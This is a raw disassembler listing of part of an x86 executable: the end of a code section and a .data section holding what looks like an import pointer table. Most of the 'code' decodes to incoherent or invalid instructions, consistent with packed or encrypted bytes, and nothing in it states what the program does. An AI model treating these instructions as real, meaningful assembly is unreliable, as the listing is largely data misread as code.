  41cc83:	inc    esi
  41cc84:	call   FWORD PTR [ebp+0x70]
  41cc87:	lods   al,BYTE PTR ds:[esi]
  41cc88:	mov    cs,WORD PTR [ebx+ecx*8+0xc]
  41cc8c:	(bad)  
  41cc8d:	shr    DWORD PTR [edx+0x76833372],0x3a
  41cc94:	xchg   esp,eax
  41cc95:	and    edi,eax
  41cc97:	push   ebp
  41cc98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc99:	mov    ds,WORD PTR [edx]
  41cc9b:	pusha  
  41cc9c:	sub    esi,DWORD PTR [esi+0x5e8831f2]
  41cca2:	test   al,0x98
  41cca4:	pop    edi
  41cca5:	fcmovnb st,st(6)
  41cca7:	xlat   BYTE PTR es:[ebx]
  41cca9:	aam    0xde
  41ccab:	xor    eax,0x5f9466c
  41ccb0:	jo     0x41ccad
  41ccb2:	add    DWORD PTR [esi+0x78e5c2b2],ebx
  41ccb8:	gs (bad) 
  41ccba:	retf   
  41ccbb:	shl    ebx,1
  41ccbd:	xlat   BYTE PTR ds:[ebx]
  41ccbe:	nop
  41ccbf:	sbb    ebx,DWORD PTR [ecx+0x1d627b88]
  41ccc5:	dec    ebp
  41ccc6:	fstp   DWORD PTR [edx-0x77]
  41ccc9:	mov    WORD PTR [ebp-0x3c49c780],?
  41cccf:	inc    eax
  41ccd0:	in     al,0xe4
  41ccd2:	sbb    al,0xfd
  41ccd4:	pop    edx
  41ccd5:	loopne 0x41ccc3
  41ccd7:	jge    0x41cc7e
  41ccd9:	pop    ebp
  41ccda:	cmp    eax,DWORD PTR [ecx-0x37d465b4]
  41cce0:	out    dx,al
  41cce1:	imul   esi,esp,0x3a
  41cce4:	fstp   QWORD PTR [esi-0x2363557f]
  41ccea:	clc    
  41cceb:	daa    
  41ccec:	(bad)  
  41ccee:	pop    eax
  41ccef:	jnp    0x41cca9
  41ccf1:	daa    
  41ccf2:	xchg   ecx,esp
  41ccf4:	ret    
  41ccf5:	icebp  
  41ccf6:	mov    ebx,ecx
  41ccf8:	xor    al,0x6e
  41ccfa:	rcr    BYTE PTR [ebp-0x31],1
  41ccfd:	jmp    0x41cccd
  41ccff:	mov    esi,0x418d9f51
  41cd04:	cmp    esi,ecx
  41cd06:	sub    esi,0xaf59f43c
  41cd0c:	push   0x49
  41cd0e:	mov    dh,0x1f
  41cd10:	inc    esp
  41cd11:	mov    cs,WORD PTR [edi+0x46]
  41cd14:	mov    ecx,0xf2c4b1ea
  41cd19:	xor    DWORD PTR [esi+0xdbfaa12],0x39e45551
  41cd23:	add    ebp,ebx
  41cd25:	fild   QWORD PTR [ebx]
  41cd27:	fistp  QWORD PTR [eax+0x77]
  41cd2a:	lock pop ecx
  41cd2c:	jno    0x41ccdf
  41cd2e:	icebp  
  41cd2f:	or     BYTE PTR [edi-0x11],0x3b
  41cd33:	sub    eax,0x64b27858
  41cd38:	mov    ebx,0xac748129
  41cd3d:	int3   
  41cd3e:	div    DWORD PTR [eax]
  41cd40:	std    
  41cd41:	sbb    ecx,eax
  41cd43:	popa   
  41cd44:	xor    eax,0xdbc81e19
  41cd49:	stos   DWORD PTR es:[edi],eax
  41cd4a:	push   ss
  41cd4b:	mov    esi,DWORD PTR [edx+0x7b]
  41cd4e:	or     dh,BYTE PTR ds:0x6d12b067
  41cd54:	push   edx
  41cd55:	push   esp
  41cd56:	les    esi,FWORD PTR [edi]
  41cd58:	sbb    ch,BYTE PTR [edi+0x105a471]
  41cd5e:	pop    eax
  41cd5f:	pusha  
  41cd60:	mov    al,ds:0x4eabe1e
  41cd65:	arpl   WORD PTR [edx-0x36a4770f],bx
  41cd6b:	ret    0x10

Disassembly of section .data:

0041d000 <.data>:
  41d000:	sbb    cl,bl
  41d002:	add    DWORD PTR [eax],eax
  41d004:	fld    DWORD PTR es:[ecx]
  41d007:	add    BYTE PTR [eax],dh
  41d009:	fld    DWORD PTR [ecx]
  41d00b:	add    BYTE PTR [edx],bh
  41d00d:	fld    DWORD PTR [ecx]
  41d00f:	add    BYTE PTR [edx-0x27],al
  41d012:	add    DWORD PTR [eax],eax
  41d014:	dec    esp
  41d015:	fld    DWORD PTR [ecx]
  41d017:	add    BYTE PTR [eax-0x27],bl
  41d01a:	add    DWORD PTR [eax],eax
  41d01c:	(bad)  
  41d01d:	fld    DWORD PTR [ecx]
  41d01f:	add    BYTE PTR [ecx+ebx*8+0x1],ch
  41d023:	add    BYTE PTR [eax-0x27],bh
  41d026:	add    DWORD PTR [eax],eax
  41d028:	sbb    cl,0x1
  41d02b:	add    BYTE PTR [eax-0x65fffe27],cl
  41d031:	fld    DWORD PTR [ecx]
  41d033:	add    BYTE PTR [eax-0x4dfffe27],ch
  41d039:	fld    DWORD PTR [ecx]
  41d03b:	add    BYTE PTR [ecx+ebx*8-0x2639ffff],bh
  41d042:	add    DWORD PTR [eax],eax
  41d044:	rcr    cl,1
  41d046:	add    DWORD PTR [eax],eax
  41d048:	loopne 0x41d023
  41d04a:	add    DWORD PTR [eax],eax
  41d04c:	jmp    0x1d9:0xf80001d9
  41d053:	add    BYTE PTR [edx+ebx*8],al
  41d056:	add    DWORD PTR [eax],eax
  41d058:	push   cs
  41d059:	fiadd  DWORD PTR [ecx]
  41d05b:	add    BYTE PTR [edx],bl
  41d05d:	fiadd  DWORD PTR [ecx]
  41d05f:	add    BYTE PTR [edx+ebx*8],ah
  41d062:	add    DWORD PTR [eax],eax
  41d064:	fiadd  DWORD PTR cs:[ecx]
  41d067:	add    BYTE PTR [eax],bh
  41d069:	fiadd  DWORD PTR [ecx]
  41d06b:	add    BYTE PTR [eax-0x26],al
  41d06e:	add    DWORD PTR [eax],eax
  41d070:	dec    esi
  41d071:	fiadd  DWORD PTR [ecx]
  41d073:	add    BYTE PTR [eax-0x26],bl
  41d076:	add    DWORD PTR [eax],eax
  41d078:	fiadd  DWORD PTR fs:[ecx]
  41d07b:	add    BYTE PTR [esi-0x26],ch
  41d07e:	add    DWORD PTR [eax],eax
  41d080:	js     0x41d05c
  41d082:	add    DWORD PTR [eax],eax
  41d084:	xchg   dl,bl
  41d086:	add    DWORD PTR [eax],eax
  41d088:	mov    ds,edx
  41d08a:	add    DWORD PTR [eax],eax
  41d08c:	call   0x1da:0xa40001da
  41d093:	add    BYTE PTR [esi-0x47fffe26],ch
  41d099:	fiadd  DWORD PTR [ecx]
  41d09b:	add    ah,cl
  41d09d:	fiadd  DWORD PTR [ecx]
  41d09f:	add    ah,bl
  41d0a1:	fiadd  DWORD PTR [ecx]
  41d0a3:	add    al,ch
  41d0a5:	fiadd  DWORD PTR [ecx]
  41d0a7:	add    dl,dh
  41d0a9:	fiadd  DWORD PTR [ecx]
  41d0ab:	add    ah,bh
  41d0ad:	fiadd  DWORD PTR [ecx]
  41d0af:	add    BYTE PTR [eax],al
  41d0b1:	add    BYTE PTR [eax],al
  41d0b3:	add    BYTE PTR [edx],dl
  41d0b5:	fild   DWORD PTR [ecx]
  41d0b7:	add    BYTE PTR [eax],dh
  41d0b9:	fild   DWORD PTR [ecx]
  41d0bb:	add    BYTE PTR [eax-0x25],cl
  41d0be:	add    DWORD PTR [eax],eax
  41d0c0:	push   0x7a0001db
  41d0c5:	fild   DWORD PTR [ecx]
  41d0c7:	add    BYTE PTR [edx-0x57fffe25],cl
  41d0cd:	fild   DWORD PTR [ecx]
  41d0cf:	add    dl,al
  41d0d1:	fild   DWORD PTR [ecx]
  41d0d3:	add    dh,dl
  41d0d5:	fild   DWORD PTR [ecx]
  41d0d7:	add    dh,ah
  41d0d9:	fild   DWORD PTR [ecx]
  41d0db:	add    BYTE PTR [edx],al
  41d0dd:	fadd   QWORD PTR [ecx]
  41d0df:	add    BYTE PTR [esp+ebx*8],bl
  41d0e2:	add    DWORD PTR [eax],eax
  41d0e4:	sub    al,0xdc
  41d0e6:	add    DWORD PTR [eax],eax
  41d0e8:	cmp    bl,ah
  41d0ea:	add    DWORD PTR [eax],eax
  41d0ec:	dec    esi
  41d0ed:	fadd   QWORD PTR [ecx]
  41d0ef:	add    BYTE PTR [edx-0x24],bl
  41d0f2:	add    DWORD PTR [eax],eax
  41d0f4:	data16 fadd QWORD PTR [ecx]
  41d0f7:	add    BYTE PTR [eax-0x24],bh
  41d0fa:	add    DWORD PTR [eax],eax
  41d0fc:	mov    bl,ah
  41d0fe:	add    DWORD PTR [eax],eax
  41d100:	pushf  
  41d101:	fadd   QWORD PTR [ecx]
  41d103:	add    BYTE PTR [esi-0x3ffffe24],ch
  41d109:	fadd   QWORD PTR [ecx]
  41d10b:	add    ah,cl
  41d10d:	fadd   QWORD PTR [ecx]
  41d10f:	add    al,ah
  41d111:	fadd   QWORD PTR [ecx]
  41d113:	add    ah,dh
  41d115:	fadd   QWORD PTR [ecx]
  41d117:	add    BYTE PTR [esi],al
  41d119:	fld    QWORD PTR [ecx]
  41d11b:	add    BYTE PTR [esi],dl
  41d11d:	fld    QWORD PTR [ecx]
  41d11f:	add    BYTE PTR [ebx*8-0x22c3ffff],ah
  41d126:	add    DWORD PTR [eax],eax
  41d128:	dec    edx
  41d129:	fld    QWORD PTR [ecx]
  41d12b:	add    BYTE PTR [eax-0x23],bl
  41d12e:	add    DWORD PTR [eax],eax
  41d130:	pusha  
  41d131:	fld    QWORD PTR [ecx]
  41d133:	add    BYTE PTR [esi-0x23],ch
  41d136:	add    DWORD PTR [eax],eax
  41d138:	test   ch,bl
  41d13a:	add    DWORD PTR [eax],eax
  41d13c:	mov    ds,ebp
  41d13e:	add    DWORD PTR [eax],eax
  41d140:	sahf   
  41d141:	fld    QWORD PTR [ecx]
  41d143:	add    BYTE PTR [ebp+ebx*8-0x2239ffff],dh
  41d14a:	add    DWORD PTR [eax],eax
  41d14c:	fcmovu st,st(5)
  41d14e:	add    DWORD PTR [eax],eax
  41d150:	out    dx,al
  41d151:	fld    QWORD PTR [ecx]
  41d153:	add    ah,bh
  41d155:	fld    QWORD PTR [ecx]
  41d157:	add    BYTE PTR [eax],cl
  41d159:	fiadd  WORD PTR [ecx]
  41d15b:	add    BYTE PTR [eax],ah
  41d15d:	fiadd  WORD PTR [ecx]
  41d15f:	add    BYTE PTR [edx],dh
  41d161:	fiadd  WORD PTR [ecx]
  41d163:	add    BYTE PTR [edx-0x22],cl
  41d166:	add    DWORD PTR [eax],eax
  41d168:	pop    esp
  41d169:	fiadd  WORD PTR [ecx]
  41d16b:	add    BYTE PTR [esi+ebx*8+0x1],dh
  41d16f:	add    BYTE PTR [edx-0x71fffe22],al
  41d175:	fiadd  WORD PTR [ecx]
  41d177:	add    BYTE PTR [edx+0x1de],ah
  41d17d:	add    BYTE PTR [eax],al
  41d17f:	add    al,al
  41d181:	fiadd  WORD PTR [ecx]
  41d183:	add    dl,cl
  41d185:	fiadd  WORD PTR [ecx]
  41d187:	add    ah,dl
  41d189:	fiadd  WORD PTR [ecx]
  41d18b:	add    al,ah
  41d18d:	fiadd  WORD PTR [ecx]
  41d18f:	add    ah,dh
  41d191:	fiadd  WORD PTR [ecx]
  41d193:	add    BYTE PTR [eax],al
  41d195:	fild   WORD PTR [ecx]
  41d197:	add    BYTE PTR [edx],bl
  41d199:	fild   WORD PTR [ecx]
  41d19b:	add    BYTE PTR [edx],ch
  41d19d:	fild   WORD PTR [ecx]
  41d19f:	add    BYTE PTR [eax],bh
  41d1a1:	fild   WORD PTR [ecx]
  41d1a3:	add    BYTE PTR [eax-0x21],dl
  41d1a6:	add    DWORD PTR [eax],eax
  41d1a8:	fild   WORD PTR fs:[ecx]
  41d1ab:	add    BYTE PTR [esi-0x21],bh
  41d1ae:	add    DWORD PTR [eax],eax
  41d1b0:	mov    edi,ds
  41d1b2:	add    DWORD PTR [eax],eax
  41d1b4:	cwde   
  41d1b5:	fild   WORD PTR [ecx]
  41d1b7:	add    BYTE PTR [esi-0x45fffe21],ah
  41d1bd:	fild   WORD PTR [ecx]
  41d1bf:	add    dh,al
  41d1c1:	fild   WORD PTR [ecx]
  41d1c3:	add    dh,dl
  41d1c5:	fild   WORD PTR [ecx]
  41d1c7:	add    dh,ah
  41d1c9:	fild   WORD PTR [ecx]
  41d1cb:	add    ah,bh
  41d1cd:	fild   WORD PTR [ecx]
  41d1cf:	add    BYTE PTR [eax],cl
  41d1d1:	loopne 0x41d1d4
  41d1d3:	add    BYTE PTR [eax+eiz*8],dl
  41d1d6:	add    DWORD PTR [eax],eax
  41d1d8:	sub    al,ah
  41d1da:	add    DWORD PTR [eax],eax
  41d1dc:	ds loopne 0x41d1e0
  41d1df:	add    BYTE PTR [esi-0x20],dl
  41d1e2:	add    DWORD PTR [eax],eax
  41d1e4:	data16 loopne 0x41d1e8
  41d1e7:	add    BYTE PTR [edx-0x20],dh
  41d1ea:	add    DWORD PTR [eax],eax
  41d1ec:	xchg   al,ah
  41d1ee:	add    DWORD PTR [eax],eax
  41d1f0:	xchg   esp,eax
  41d1f1:	loopne 0x41d1f4
  41d1f3:	add    BYTE PTR [esi-0x47fffe20],ch
  41d1f9:	loopne 0x41d1fc
  41d1fb:	add    dl,cl
  41d1fd:	loopne 0x41d200
  41d1ff:	add    ah,bl
  41d201:	loopne 0x41d204
  41d203:	add    dh,ch
  41d205:	loopne 0x41d208
  41d207:	add    dh,bh
  41d209:	loopne 0x41d20c
  41d20b:	add    BYTE PTR [eax],cl
  41d20d:	loope  0x41d210
  41d20f:	add    BYTE PTR [esi],bl
  41d211:	loope  0x41d214
  41d213:	add    BYTE PTR [edx],dh
  41d215:	loope  0x41d218
  41d217:	add    BYTE PTR [esi-0x1f],al
  41d21a:	add    DWORD PTR [eax],eax
  41d21c:	push   esi
  41d21d:	loope  0x41d220
  41d21f:	add    BYTE PTR [esi-0x1f],ah
  41d222:	add    DWORD PTR [eax],eax
  41d224:	jb     0x41d207
  41d226:	add    DWORD PTR [eax],eax
  41d228:	test   cl,ah
  41d22a:	add    DWORD PTR [eax],eax
  41d22c:	mov    al,ds:0xb60001e1
  41d231:	loope  0x41d234
  41d233:	add    dl,al
  41d235:	loope  0x41d238
  41d237:	add    dh,dl
  41d239:	loope  0x41d23c
  41d23b:	add    BYTE PTR [eax],al
  41d23d:	add    BYTE PTR [eax],al
  41d23f:	add    ah,dh
  41d241:	loope  0x41d244
  41d243:	add    BYTE PTR [edx+eiz*8],al
  41d246:	add    DWORD PTR [eax],eax
  41d248:	adc    al,0xe2
  41d24a:	add    DWORD PTR [eax],eax
  41d24c:	and    ah,dl
  41d24e:	add    DWORD PTR [eax],eax
  41d250:	xor    dl,ah
  41d252:	add    DWORD PTR [eax],eax
  41d254:	ds loop 0x41d258
  41d257:	add    BYTE PTR [edx-0x1e],dl
  41d25a:	add    DWORD PTR [eax],eax
  41d25c:	pusha  
  41d25d:	loop   0x41d260
  41d25f:	add    BYTE PTR [edx-0x1e],bh
  41d262:	add    DWORD PTR [eax],eax
  41d264:	xchg   dl,ah
  41d266:	add    DWORD PTR [eax],eax
  41d268:	cwde   
  41d269:	loop   0x41d26c
  41d26b:	add    BYTE PTR [edx+eiz*8-0x1d47ffff],ah
  41d272:	add    DWORD PTR [eax],eax
  41d274:	int3   
  41d275:	loop   0x41d278
  41d277:	add    dh,dl
  41d279:	loop   0x41d27c
  41d27b:	add    al,ah
  41d27d:	loop   0x41d280
  41d27f:	add    dl,bh
  41d281:	loop   0x41d284
  41d283:	add    BYTE PTR [edx],cl
  41d285:	jecxz  0x41d288
  41d287:	add    BYTE PTR [edx],bl
  41d289:	jecxz  0x41d28c
  41d28b:	add    BYTE PTR [ebx+eiz*8],ah
  41d28e:	add    DWORD PTR [eax],eax
  41d290:	xor    al,0xe3
  41d292:	add    DWORD PTR [eax],eax
  41d294:	inc    eax
  41d295:	jecxz  0x41d298
  41d297:	add    BYTE PTR [esi-0x1d],cl
  41d29a:	add    DWORD PTR [eax],eax
  41d29c:	fs jecxz 0x41d2a0
  41d29f:	add    BYTE PTR [esi-0x1d],dh
  41d2a2:	add    DWORD PTR [eax],eax
  41d2a4:	mov    fs,ebx
  41d2a6:	add    DWORD PTR [eax],eax
  41d2a8:	mov    ds:0xb00001e3,al
  41d2ad:	jecxz  0x41d2b0
  41d2af:	add    dl,al
  41d2b1:	jecxz  0x41d2b4
  41d2b3:	add    dh,cl
  41d2b5:	jecxz  0x41d2b8
  41d2b7:	add    dh,bl
  41d2b9:	jecxz  0x41d2bc
  41d2bb:	add    ah,ch
  41d2bd:	jecxz  0x41d2c0
  41d2bf:	add    BYTE PTR [eax],al
  41d2c1:	in     al,0x1
  41d2c3:	add    BYTE PTR [esi],cl
  41d2c5:	in     al,0x1
  41d2c7:	add    BYTE PTR [edx],ch
  41d2c9:	in     al,0x1
  41d2cb:	add    BYTE PTR [esp+eiz*8],bh
  41d2ce:	add    DWORD PTR [eax],eax
  41d2d0:	dec    esp
  41d2d1:	in     al,0x1
  41d2d3:	add    BYTE PTR [esi-0x1c],bl
  41d2d6:	add    DWORD PTR [eax],eax
  41d2d8:	push   0xffffffe4
  41d2da:	add    DWORD PTR [eax],eax
  41d2dc:	jl     0x41d2c2
  41d2de:	add    DWORD PTR [eax],eax
  41d2e0:	mov    ah,ah
  41d2e2:	add    DWORD PTR [eax],eax
  41d2e4:	cwde   
  41d2e5:	in     al,0x1
  41d2e7:	add    BYTE PTR [esi-0x3ffffe1c],ch
  41d2ed:	in     al,0x1
  41d2ef:	add    al,dl
  41d2f1:	in     al,0x1
  41d2f3:	add    dl,ah
  41d2f5:	in     al,0x1
  41d2f7:	add    al,dh
  41d2f9:	in     al,0x1
  41d2fb:	add    BYTE PTR [eax],cl
  41d2fd:	in     eax,0x1
  41d2ff:	add    BYTE PTR [eiz*8-0x1ad5ffff],bl
  41d306:	add    DWORD PTR [eax],eax
  41d308:	ds in  eax,0x1
  41d30b:	add    BYTE PTR [edx-0x1b],cl
  41d30e:	add    DWORD PTR [eax],eax
  41d310:	pop    edx
  41d311:	in     eax,0x1
  41d313:	add    BYTE PTR [esi-0x1b],ch
  41d316:	add    DWORD PTR [eax],eax
  41d318:	jle    0x41d2ff
  41d31a:	add    DWORD PTR [eax],eax
  41d31c:	nop
  41d31d:	in     eax,0x1
  41d31f:	add    BYTE PTR [ebp+eiz*8-0x1a55ffff],bl
  41d326:	add    DWORD PTR [eax],eax
  41d328:	mov    eax,0xca0001e5
  41d32d:	in     eax,0x1
  41d32f:	add    dl,bl
  41d331:	in     eax,0x1
  41d333:	add    dh,ah
  41d335:	in     eax,0x1
  41d337:	add    ah,bh
  41d339:	in     eax,0x1
  41d33b:	add    BYTE PTR [esi],cl
  41d33d:	out    0x1,al
  41d33f:	add    BYTE PTR [eax],ch
  41d341:	out    0x1,al
  41d343:	add    BYTE PTR [edx],bh
  41d345:	out    0x1,al
  41d347:	add    BYTE PTR [esi+eiz*8+0x1],cl
  41d34b:	add    BYTE PTR [eax-0x1a],bl
  41d34e:	add    DWORD PTR [eax],eax
  41d350:	push   0x7a0001e6
  41d355:	out    0x1,al
  41d357:	add    BYTE PTR [esi-0x67fffe1a],al
  41d35d:	out    0x1,al
  41d35f:	add    BYTE PTR [edx-0x35fffe1a],dh
  41d365:	out    0x1,al
  41d367:	add    ah,bl
  41d369:	out    0x1,al
  41d36b:	add    dl,ch
  41d36d:	out    0x1,al
  41d36f:	add    al,bh
  41d371:	out    0x1,al
  41d373:	add    BYTE PTR [esi],cl
  41d375:	out    0x1,eax
  41d377:	add    BYTE PTR [esi],bl
  41d379:	out    0x1,eax
  41d37b:	add    BYTE PTR [edx],ch
  41d37d:	out    0x1,eax
  41d37f:	add    BYTE PTR [edx],bh
  41d381:	out    0x1,eax
  41d383:	add    BYTE PTR [edx-0x19],cl
  41d386:	add    DWORD PTR [eax],eax
  41d388:	pop    esp
  41d389:	out    0x1,eax
  41d38b:	add    BYTE PTR [eax-0x19],ch
  41d38e:	add    DWORD PTR [eax],eax
  41d390:	jbe    0x41d379
  41d392:	add    DWORD PTR [eax],eax
  41d394:	xchg   bh,ah
  41d396:	add    DWORD PTR [eax],eax
  41d398:	cwde   
  41d399:	out    0x1,eax
  41d39b:	add    BYTE PTR [eax-0x45fffe19],ch
  41d3a1:	out    0x1,eax
  41d3a3:	add    al,dl
  41d3a5:	out    0x1,eax
  41d3a7:	add    dh,ah
  41d3a9:	out    0x1,eax
  41d3ab:	add    dh,dh
  41d3ad:	out    0x1,eax
  41d3af:	add    BYTE PTR [edx],al
  41d3b1:	call   0xe859d3b7
  41d3b6:	add    DWORD PTR [eax],eax
  41d3b8:	and    al,0xe8
  41d3ba:	add    DWORD PTR [eax],eax
  41d3bc:	xor    al,0xe8
  41d3be:	add    DWORD PTR [eax],eax
  41d3c0:	dec    eax
  41d3c1:	call   0xe897d3c7
  41d3c6:	add    DWORD PTR [eax],eax
  41d3c8:	callw  0xd3cd
  41d3cc:	jp     0x41d3b6
  41d3ce:	add    DWORD PTR [eax],eax
  41d3d0:	xchg   al,ch
  41d3d2:	add    DWORD PTR [eax],eax
  41d3d4:	xchg   esi,eax
  41d3d5:	call   0xe8e3d3db
  41d3da:	add    DWORD PTR [eax],eax
  41d3dc:	mov    dl,0xe8
  41d3de:	add    DWORD PTR [eax],eax
  41d3e0:	(bad)  
  41d3e1:	call   0xe913d3e7
  41d3e6:	add    DWORD PTR [eax],eax
  41d3e8:	in     al,0xe8
  41d3ea:	add    DWORD PTR [eax],eax
  41d3ec:	lock call 0xe93fd3f3
  41d3f2:	add    DWORD PTR [eax],eax
  41d3f4:	or     al,0xe9
  41d3f6:	add    DWORD PTR [eax],eax
  41d3f8:	sbb    ch,cl
  41d3fa:	add    DWORD PTR [eax],eax
  41d3fc:	add    BYTE PTR [eax],al
  41d3fe:	add    BYTE PTR [eax],al
  41d400:	or     al,0x2
  41d402:	add    BYTE PTR [eax+0x0],al
  41d408:	add    BYTE PTR [eax],al
  41d40a:	add    BYTE PTR [eax],al
  41d40c:	das    
  41d40d:	and    DWORD PTR [ecx*2+0x0],edx
  41d414:	add    al,BYTE PTR [eax]
  41d416:	add    BYTE PTR [eax],al
  41d418:	pop    ebp
  41d419:	add    BYTE PTR [eax],al
  41d41b:	add    BYTE PTR [ebx+ebp*4+0x2],dh
  41d41f:	add    BYTE PTR [ebp+ebx*4+0x2],dh
	...
  41d42b:	add    BYTE PTR [edi],ch
  41d42d:	and    DWORD PTR [ecx*2+0x0],edx
  41d434:	pop    edx
  41d435:	aam    0x1
  41d437:	add    BYTE PTR [ecx],al
  41d439:	add    BYTE PTR [eax],al
  41d43b:	add    BYTE PTR [ecx],al
  41d43d:	add    BYTE PTR [eax],al
  41d43f:	add    BYTE PTR [ecx],al
  41d441:	add    BYTE PTR [eax],al
  41d443:	add    BYTE PTR [eax-0x2c],dl
  41d446:	add    DWORD PTR [eax],eax
  41d448:	push   esp
  41d449:	aam    0x1
  41d44b:	add    BYTE PTR [eax-0x2c],bl
  41d44e:	add    DWORD PTR [eax],eax
  41d450:	xchg   edi,eax
  41d451:	inc    ebx
  41d452:	add    BYTE PTR [eax],al
  41d454:	imul   edx,esp,0x1
  41d457:	add    BYTE PTR [eax],al
  41d459:	add    BYTE PTR [eax+ebp*2+0x58],ah
  41d45d:	xor    dl,BYTE PTR [eax+0x78]
  41d460:	jp     0x41d4aa
  41d462:	jp     0x41d4d5
  41d464:	outs   dx,BYTE PTR ds:[esi]
  41d465:	je     0x41d495
  41d467:	je     0x41d4d2
  41d469:	jo     0x41d46b
  41d46b:	aas    
  41d46c:	dec    eax
  41d46d:	imul   esp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  41d475:	gs jb  0x41d4c7
  41d478:	jb     0x41d4e3
  41d47a:	imul   ebp,DWORD PTR [bp+0x61],0x5940406c
  41d482:	inc    edi
  41d483:	inc    esi
  41d484:	dec    ebx
  41d485:	push   eax
  41d486:	inc    ecx
  41d487:	dec    ecx
  41d488:	push   eax
  41d489:	inc    ecx
  41d48a:	inc    esp
  41d48b:	cmp    al,0x56
	...
  41d495:	add    BYTE PTR [eax],al
  41d497:	add    BYTE PTR [eax],dl
  41d499:	aad    0x1
	...
  41d4a3:	add    BYTE PTR [esi],al
  41d4a5:	fild   DWORD PTR [ecx]
  41d4a7:	add    BYTE PTR [eax],al
  41d4a9:	rol    BYTE PTR [ecx],1
  41d4ab:	add    ah,al
  41d4ad:	aad    0x1
	...
  41d4b7:	add    BYTE PTR [edx-0x4bfffe22],dh
  41d4bd:	rol    BYTE PTR [ecx],1
  41d4bf:	add    BYTE PTR [eax+0x1d6],dl
  41d4c5:	add    BYTE PTR [eax],al
  41d4c7:	add    BYTE PTR [eax],al
  41d4c9:	add    BYTE PTR [eax],al
  41d4cb:	add    dl,ch
  41d4cd:	loope  0x41d4d0
  41d4cf:	add    BYTE PTR [eax+0x500001d1],al
  41d4d5:	xlat   BYTE PTR ds:[ebx]
  41d4d6:	add    DWORD PTR [eax],eax
	...
  41d4e0:	ss jmp 0xd281d4e7
  41d4e6:	add    DWORD PTR [eax],eax
  41d4e8:	adc    cl,bl
  41d4ea:	add    DWORD PTR [eax],eax
	...
  41d4f4:	inc    edx
  41d4f5:	jmp    0xd441d4fb
  41d4fa:	add    DWORD PTR [eax],eax
	...
  41d510:	sbb    cl,bl
  41d512:	add    DWORD PTR [eax],eax
  41d514:	fld    DWORD PTR es:[ecx]
  41d517:	add    BYTE PTR [eax],dh
  41d519:	fld    DWORD PTR [ecx]
  41d51b:	add    BYTE PTR [edx],bh
  41d51d:	fld    DWORD PTR [ecx]
  41d51f:	add    BYTE PTR [edx-0x27],al
  41d522:	add    DWORD PTR [eax],eax
  41d524:	dec    esp
  41d525:	fld    DWORD PTR [ecx]
  41d527:	add    BYTE PTR [eax-0x27],bl
  41d52a:	add    DWORD PTR [eax],eax
  41d52c:	(bad)  
  41d52d:	fld    DWORD PTR [ecx]
  41d52f:	add    BYTE PTR [ecx+ebx*8+0x1],ch
  41d533:	add    BYTE PTR [eax-0x27],bh
  41d536:	add    DWORD PTR [eax],eax
  41d538:	sbb    cl,0x1
  41d53b:	add    BYTE PTR [eax-0x65fffe27],cl
  41d541:	fld    DWORD PTR [ecx]
  41d543:	add    BYTE PTR [eax-0x4dfffe27],ch
  41d549:	fld    DWORD PTR [ecx]
  41d54b:	add    BYTE PTR [ecx+ebx*8-0x2639ffff],bh
  41d552:	add    DWORD PTR [eax],eax
  41d554:	rcr    cl,1
  41d556:	add    DWORD PTR [eax],eax
  41d558:	loopne 0x41d533
  41d55a:	add    DWORD PTR [eax],eax
  41d55c:	jmp    0x1d9:0xf80001d9
  41d563:	add    BYTE PTR [edx+ebx*8],al
  41d566:	add    DWORD PTR [eax],eax
  41d568:	push   cs
  41d569:	fiadd  DWORD PTR [ecx]
  41d56b:	add    BYTE PTR [edx],bl
  41d56d:	fiadd  DWORD PTR [ecx]
  41d56f:	add    BYTE PTR [edx+ebx*8],ah
  41d572:	add    DWORD PTR [eax],eax
  41d574:	fiadd  DWORD PTR cs:[ecx]
  41d577:	add    BYTE PTR [eax],bh
  41d579:	fiadd  DWORD PTR [ecx]
  41d57b:	add    BYTE PTR [eax-0x26],al
  41d57e:	add    DWORD PTR [eax],eax
  41d580:	dec    esi
  41d581:	fiadd  DWORD PTR [ecx]
  41d583:	add    BYTE PTR [eax-0x26],bl
  41d586:	add    DWORD PTR [eax],eax
  41d588:	fiadd  DWORD PTR fs:[ecx]
  41d58b:	add    BYTE PTR [esi-0x26],ch
  41d58e:	add    DWORD PTR [eax],eax
  41d590:	js     0x41d56c
  41d592:	add    DWORD PTR [eax],eax
  41d594:	xchg   dl,bl
  41d596:	add    DWORD PTR [eax],eax
  41d598:	mov    ds,edx
  41d59a:	add    DWORD PTR [eax],eax
  41d59c:	call   0x1da:0xa40001da
  41d5a3:	add    BYTE PTR [esi-0x47fffe26],ch
  41d5a9:	fiadd  DWORD PTR [ecx]
  41d5ab:	add    ah,cl
  41d5ad:	fiadd  DWORD PTR [ecx]
  41d5af:	add    ah,bl
  41d5b1:	fiadd  DWORD PTR [ecx]
  41d5b3:	add    al,ch
  41d5b5:	fiadd  DWORD PTR [ecx]
  41d5b7:	add    dl,dh
  41d5b9:	fiadd  DWORD PTR [ecx]
  41d5bb:	add    ah,bh
  41d5bd:	fiadd  DWORD PTR [ecx]
  41d5bf:	add    BYTE PTR [eax],al
  41d5c1:	add    BYTE PTR [eax],al
  41d5c3:	add    BYTE PTR [edx],dl
  41d5c5:	fild   DWORD PTR [ecx]
  41d5c7:	add    BYTE PTR [eax],dh
  41d5c9:	fild   DWORD PTR [ecx]
  41d5cb:	add    BYTE PTR [eax-0x25],cl
  41d5ce:	add    DWORD PTR [eax],eax
  41d5d0:	push   0x7a0001db
  41d5d5:	fild   DWORD PTR [ecx]
  41d5d7:	add    BYTE PTR [edx-0x57fffe25],cl
  41d5dd:	fild   DWORD PTR [ecx]
  41d5df:	add    dl,al
  41d5e1:	fild   DWORD PTR [ecx]
  41d5e3:	add    dh,dl
  41d5e5:	fild   DWORD PTR [ecx]
  41d5e7:	add    dh,ah
  41d5e9:	fild   DWORD PTR [ecx]
  41d5eb:	add    BYTE PTR [edx],al
  41d5ed:	fadd   QWORD PTR [ecx]
  41d5ef:	add    BYTE PTR [esp+ebx*8],bl
  41d5f2:	add    DWORD PTR [eax],eax
  41d5f4:	sub    al,0xdc
  41d5f6:	add    DWORD PTR [eax],eax
  41d5f8:	cmp    bl,ah
  41d5fa:	add    DWORD PTR [eax],eax
  41d5fc:	dec    esi
  41d5fd:	fadd   QWORD PTR [ecx]
  41d5ff:	add    BYTE PTR [edx-0x24],bl
  41d602:	add    DWORD PTR [eax],eax
  41d604:	data16 fadd QWORD PTR [ecx]
  41d607:	add    BYTE PTR [eax-0x24],bh
  41d60a:	add    DWORD PTR [eax],eax
